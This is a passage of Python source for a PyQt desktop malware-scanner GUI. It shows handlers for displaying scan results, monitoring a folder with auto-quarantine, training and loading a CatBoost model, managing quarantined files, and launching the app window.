        self._log(f"Scanning {len(files)} files...","info")
        self.scan_worker = ScanWorker(files, self.s_use_ml.isChecked() and self.model.is_loaded, self.model)
        self.scan_worker.result.connect(self._on_scan_result)
        self.scan_worker.progress.connect(lambda c,t: self.s_progress.setValue(c))
        self.scan_worker.done.connect(self._on_scan_done)
        self.scan_worker.start()

    def _on_scan_result(self, r):
        try:
            sev_colors = {'critical':T.RED,'high':T.ORANGE,'warning':T.YELLOW,'clean':T.GREEN,'error':T.RED}
            if 'ml_label' in r:
                item = QTreeWidgetItem([r['file'], r['severity'].upper(), r['ml_label'],
                                        f"{r['ml_risk']:.1f}%", f"{r.get('ml_conf',0)*100:.1f}%",
                                        str(r['yara_count']),
                                        str(r['findings']), ', '.join(r.get('yara_rules',[])[:3])])
            else:
                details = '; '.join(f['detail'] for f in r.get('details',[])[:3])
                item = QTreeWidgetItem([r['file'], r['severity'].upper(), '—', '—', '—', '—',
                                        str(r.get('findings',0)), details])
            color = sev_colors.get(r['severity'], T.FG)
            for i in range(8): item.setForeground(i, QColor(color))
            self.s_tree.addTopLevelItem(item)
            self.counts['scanned'] += 1; self.d_scanned._val.setText(str(self.counts['scanned']))
        except RuntimeError:
            pass  # Widget deleted

    def _on_scan_done(self, stats):
        try:
            self._log(f"Scan complete: {stats['total']} files, {stats['threats']} threats",
                      "critical" if stats['threats']>0 else "success")
            self.counts['threats'] += stats['threats']; self.d_threats._val.setText(str(self.counts['threats']))
            if stats['threats']>0:
                Notifier.send("THREATS DETECTED",f"{stats['threats']} threats in {stats['total']} files","critical")
                if hasattr(self, 'd_alerts'):
                    append_log(self.d_alerts, f"[{datetime.now().strftime('%H:%M:%S')}] ⚠ {stats['threats']} threats in {stats['total']} files", T.RED)
                # Auto-quarantine: offer to quarantine files flagged as threats
                if stats.get('threat_files'):
                    reply = QMessageBox.question(self, "Quarantine Threats",
                        f"{stats['threats']} threats detected. Quarantine {len(stats['threat_files'])} files?",
                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                    if reply == QMessageBox.StandardButton.Yes:
                        quarantined = 0
                        for fpath, findings in stats['threat_files']:
                            scan_result = self._findings_to_scan_result(fpath, findings)
                            qid = self.q_manager.quarantine(fpath, scan_result, force=True)
                            if qid: quarantined += 1
                        self._log(f"Quarantined {quarantined} files", "critical")
                        self._refresh_quarantine()
        except RuntimeError:
            pass  # Widget deleted

    # ── Monitor Action ───────────────────────────────────────

    def _toggle_monitor(self):
        try:
            if self.mon_worker and self.mon_worker.running:
                self.mon_worker.stop_watch(); self.m_btn.setText("▶ START")
                self.m_btn.setStyleSheet(f"background:{T.GREEN};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold")
                self._log("Monitor stopped","warning")
            else:
                d = self.m_dir.text().strip()
                if not os.path.isdir(d): QMessageBox.warning(self,"Error","Select a valid directory"); return
                self.m_btn.setText("■ STOP")
                self.m_btn.setStyleSheet(f"background:{T.RED};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold")
                self._log(f"Monitoring: {d}","success")
                self.mon_worker = MonitorWorker()
                self.mon_worker.alert.connect(self._on_monitor_alert)
                self.mon_worker.stats.connect(self._on_monitor_stats)
                self.mon_worker.start_watch(d)
        except RuntimeError:
            pass  # Widget deleted

    def _findings_to_scan_result(self, filepath, findings):
        """Convert detector findings to QuarantineManager scan_result format."""
        sev_map = {'critical': 95, 'high': 80, 'warning': 50, 'info': 20, 'error': 0}
        max_sev = max((sev_map.get(f.get('severity', 'info'), 0) for f in findings), default=0)
        max_sev_name = 'CRITICAL' if max_sev >= 90 else 'HIGH' if max_sev >= 70 else 'MEDIUM' if max_sev >= 40 else 'LOW'
        sorted_findings = sorted(findings, key=lambda f: sev_map.get(f.get('severity', 'info'), 0), reverse=True)
        primary_label = sorted_findings[0].get('type', 'UNKNOWN') if sorted_findings else 'UNKNOWN'
        types = list({f.get('type', 'UNKNOWN') for f in findings})
        return {
            'label': primary_label,
            'confidence': max_sev / 100.0,
            'risk_score': float(max_sev),
            'risk_level': max_sev_name,
            'yara_matches': [],
            'detected_types': types,
        }

    def _on_monitor_alert(self, a):
        try:
            if hasattr(self, 'm_feed'):
                append_log(self.m_feed, f"[{a['time']}] [{a['severity'].upper()}] {a['file']}", T.RED)
                append_log(self.m_feed, f"  → {a['detail']}", T.DIM)
            if hasattr(self, 'd_alerts'):
                append_log(self.d_alerts, f"[{a['time']}] ⚠ {a['file']}: {a['detail']}", T.RED)
            self.counts['threats'] += 1
            if hasattr(self, 'd_threats'):
                self.d_threats._val.setText(str(self.counts['threats']))
            # Auto-quarantine monitored threats
            if a.get('path') and a.get('findings') and hasattr(self, 'q_manager'):
                scan_result = self._findings_to_scan_result(a['path'], a['findings'])
                qid = self.q_manager.quarantine(a['path'], scan_result, force=True)
                if qid and hasattr(self, 'd_alerts'):
                    append_log(self.d_alerts, f"  🔒 Quarantined {a['file']} (ID: {qid})", T.ORANGE)
                    self._log(f"Auto-quarantined: {a['file']}", "critical")
        except RuntimeError:
            pass  # Widget deleted

    def _on_monitor_stats(self, s):
        try:
            if hasattr(self, 'm_scanned'):
                self.m_scanned._val.setText(str(s['scanned']))
                self.m_threats._val.setText(str(s['threats']))
                self.m_clean._val.setText(str(s['clean']))
        except RuntimeError:
            pass  # Widget deleted

    # ── Training Action ──────────────────────────────────────

    def _run_training(self):
        self.t_log.clear()
        self.train_worker = TrainWorker(self.t_samples.value(), self.t_task.currentText())
        self.train_worker.log.connect(lambda t: append_log(self.t_log, t, T.CYAN if "ERROR" not in t else T.RED))
        self.train_worker.done.connect(self._on_train_done)
        self.train_worker.start()

    def _on_train_done(self, meta):
        try:
            if 'error' in meta:
                self._log(f"Training failed: {meta['error']}","critical")
            else:
                self._log("Model trained and saved!","success")
                try: self.model.load("models/polyglot_shield.cbm")
                except: pass
                if hasattr(self, 's_use_ml'):
                    self.s_use_ml.setChecked(self.model.is_loaded)
        except RuntimeError:
            pass  # Widget deleted

    def _load_model(self):
        p,_ = QFileDialog.getOpenFileName(self,"Load Model","","CatBoost Model (*.cbm);;All Files (*)")
        if p:
            try: self.model.load(p); self._log(f"Model loaded: {p}","success")
            except Exception as e: self._log(f"Load failed: {e}","critical")

    # ── Quarantine Actions ───────────────────────────────────

    def _refresh_quarantine(self):
        self.q_tree.clear()
        entries = self.q_manager.list_quarantined()
        sev_colors = {'CRITICAL':T.RED,'HIGH':T.ORANGE,'MEDIUM':T.YELLOW,'LOW':T.DIM,'SAFE':T.GREEN}
        for m in entries:
            status = "Restored" if m.get('restored') else "Quarantined"
            item = QTreeWidgetItem([m.get('quarantine_id','?')[:8], m.get('original_name','?'),
                                    m.get('risk_level','?'), f"{m.get('confidence',0):.2f}",
                                    m.get('timestamp','?')[:19], status])
            color = sev_colors.get(m.get('risk_level',''), T.FG)
            for i in range(6): item.setForeground(i, QColor(color))
            self.q_tree.addTopLevelItem(item)

    def _purge_quarantine(self):
        purged = self.q_manager.auto_purge_expired()
        self._log(f"Purged {purged} expired entries","info")
        self._refresh_quarantine()

    def _restore_quarantine(self):
        item = self.q_tree.currentItem()
        if not item: return
        qid = item.text(0)
        dest,_ = QFileDialog.getSaveFileName(self,"Restore To")
        if dest:
            r = self.q_manager.restore(qid, dest)
            if r: self._log(f"Restored: {r}","success")
            else: self._log("Restore failed","critical")
            self._refresh_quarantine()

    def _delete_quarantine(self):
        item = self.q_tree.currentItem()
        if not item: return
        qid = item.text(0)
        reply = QMessageBox.question(self, "Confirm Delete",
            f"Permanently delete quarantined file {qid}?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply == QMessageBox.StandardButton.Yes:
            if self.q_manager.delete(qid):
                self._log(f"Deleted: {qid}","warning")
            else:
                self._log("Delete failed — not found","critical")
        self._refresh_quarantine()

    # ── YARA / Logs / Settings ───────────────────────────────

    def _quick_scan(self):
        p,_ = QFileDialog.getOpenFileName(self,"Quick Scan")
        if p: self.s_path.setText(p); self._switch(2,self.nav[2]); self._run_scanner()

    def _quick_sanitize(self):
        p,_ = QFileDialog.getOpenFileName(self,"Quick Sanitize")
        if p:
            r = self.sanitizer.sanitize(p)
            self._log(f"Sanitize: {r['detail']}",'success' if r['status']=='sanitized' else 'info')
            self.counts['sanitized'] += 1; self.d_sanitized._val.setText(str(self.counts['sanitized']))

    def _export_log(self):
        p,_ = QFileDialog.getSaveFileName(self,"Export Log","polyglot_log.txt","Text (*.txt)")
        if p:
            with open(p,'w') as f: f.write(self.log_box_main.toPlainText())
            Notifier.send("Log Exported",f"Saved to {os.path.basename(p)}")


# ── Entry Point ──────────────────────────────────────────────

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(T.BG))
    palette.setColor(QPalette.ColorRole.WindowText, QColor(T.FG))
    palette.setColor(QPalette.ColorRole.Base, QColor(T.BG_IN))
    palette.setColor(QPalette.ColorRole.AlternateBase, QColor(T.BG2))
    palette.setColor(QPalette.ColorRole.Text, QColor(T.FG))
    palette.setColor(QPalette.ColorRole.Button, QColor(T.BG3))
    palette.setColor(QPalette.ColorRole.ButtonText, QColor(T.FG))
    palette.setColor(QPalette.ColorRole.Highlight, QColor(T.RED))
    palette.setColor(QPalette.ColorRole.HighlightedText, QColor("#ffffff"))
    app.setPalette(palette)
    window = PolyglotApp()
    window.show()
    sys.exit(app.exec())

if __name__ == '__main__':
    main()
